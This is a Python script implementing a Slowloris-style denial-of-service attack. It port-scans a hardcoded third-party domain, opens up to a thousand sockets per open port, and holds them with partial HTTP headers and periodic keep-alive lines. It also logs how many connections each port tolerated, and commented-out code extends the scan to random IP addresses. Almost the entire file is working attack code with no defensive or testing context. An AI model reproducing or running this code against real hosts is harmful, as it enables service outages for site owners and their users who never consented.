import socket
import random
import time
import sys
import ssl
import traceback
import asyncio
import sqlite3
from os import system

listOfSockets = list()
ip = None
port = None
quantityOfSockets = 1000
maximum_connections = 0
keep_alive = True
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

# def create_openSSL():
# 	print('openSSL key and cert were created')
# 	system('openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem')
# 	for i in range(7):
# 		system(str(10+i))

conn = sqlite3.connect('db.db')
cursor = conn.cursor()
try:
	cursor.execute("""CREATE TABLE checked_ip
	                  (ip_address text, port text, maximum_connections text)
	               """)
	print('DB was created')
except:
	pass

conn.commit()

def portsCheck():

	global ip

	print('checking ports')
	open_ports = []

	print(ip)
	for port in [80, 443, 445, 5901, 8080, 8081]:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		s.settimeout(0.2)
		try:
			s.connect((ip, port))
			open_ports.append(port)
		except:
			pass

		s.close()

	print(open_ports)

	return open_ports



def socketInit():

	global ip
	global port

	while True:
		if ip:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(5)
				# time.sleep(0.1)
				s.connect((ip, port))
				break
			except:
				break

		else:
			print('Please enter an IP address!')
			ip = input('IP: ')
			


	s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode('utf-8'))
	header = 'User-Agent: {}\r\n'.format(random.choice(user_agents)).encode('utf-8')
	s.send(header)
	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
	# print('{}. Socket port: {} IP: {}'.format(len(listOfSockets), port, ip))
	
	return s


async def keeping_active():

	global listOfSockets
	global ip
	global port
	global keep_alive

	print('Keeping active...')

	while keep_alive:

		print('{} sockets on {}:{} Still alive..'.format(len(listOfSockets), ip, port))

		for s in listOfSockets:
			if listOfSockets.index(s) % 100:
				await asyncio.sleep(0.01)
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			except socket.error:
				print('ADDITIONAL SOCKET')
				listOfSockets.remove(s)
				socketInit()
				listOfSockets.append(s)
				continue
		
		await asyncio.sleep(5)

	# print('AA')
	# print('{} sockets Still alive..'.format(len(listOfSockets)))
	# for s in listOfSockets:
	# 	try:
	# 		s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
	# 	except socket.error:
	# 		listOfSockets.remove(s)
	# 		continue
	
	# await asyncio.sleep(5)






async def connection():

	global ip
	global port
	global quantityOfSockets
	global listOfSockets
	global maximum_connections
	global keep_alive

	keep_alive = True

	for _ in range(quantityOfSockets):
		try:
			s = socketInit()

			if len(listOfSockets) % 100 == 0:
				print(len(listOfSockets))
				await asyncio.sleep(0.01)

			# print(s)
		except socket.timeout:
			break
		except BrokenPipeError:
			continue
		except KeyboardInterrupt:
			for s in listOfSockets:
				s.close()
				listOfSockets.remove(s)
				break
		except:
			continue

		listOfSockets.append(s)


	# while len(listOfSockets) < quantityOfSockets:
	# 	try:
	# 		s = socketInit()
	# 	except socket.timeout:
	# 		break

	result = len(listOfSockets)

	for s in listOfSockets:
		s.close()
		listOfSockets.remove(s)

	listOfSockets = []

	keep_alive = False

	maximum_connections = result



def rand_ip():
	random_ip = '{}.{}.{}.{}'.format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
	return random_ip


async def main_loop():


	task1 = asyncio.create_task(connection())
	task2 = asyncio.create_task(keeping_active())

	await asyncio.gather(task1, task2)

	


if __name__ == "__main__":


	ip = 'marcozo.com'

	ports = portsCheck()
	
	for p in ports:
		
		port = p

		asyncio.run(main_loop())


		cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(maximum_connections)))
		print('IP - {}, Port - {}, Conn - {}'.format(ip, port, maximum_connections))
		conn.commit()
		db_txt = open('db.txt', 'a+')
		db_txt.write('{} {} {}\n'.format(ip, port, maximum_connections))
		db_txt.close()

		maximum_connections = 0


	cursor.close()



	# print('Scaning...')
	# counter = 0
	# db_txt = open('db.txt', 'a+')

	# while True:
	# 	if counter == 0:
	# 		db_txt.close()
	# 		conn.commit()
	# 		db_txt = open('db.txt', 'a+')

	# 	try:
	# 		# ip = rand_ip()
	# 		ip = '127.0.0.1'

	# 		ports = portsCheck(ip)

	# 		for p in ports:
	# 			port = p
	# 			print('Scaning IP: {} Port: {}'.format(ip, port))
	# 			count = connection(ip, port, maximum_sockets)
	# 			print('End of {}:{} scanning'.format(ip, port))
	# 			if count == maximum_sockets:
	# 				count = '>'+str(count) 
	# 			try:
	# 				cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
	# 				db_txt.write('{} {} {}'.format(ip, port, count))
	# 				print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
	# 				conn.commit()
	# 			except:
	# 				pass

	# 	except KeyboardInterrupt:
			
	# 		conn.commit()
			
	# 		cursor.execute("SELECT * from checked_ip")
	# 		results = cursor.fetchall()
	# 		for i in results:
	# 			ip, port, conn = i
	# 			print('{} - {} - {}'.format(ip, port, conn))
	# 		cursor.close()
	# 		break
	# 	except:
	# 		print(traceback.format_exc())
	# 		continue
	# 	if counter != 10:
	# 		counter += 1
	# 	else:
	# 		counter = 0



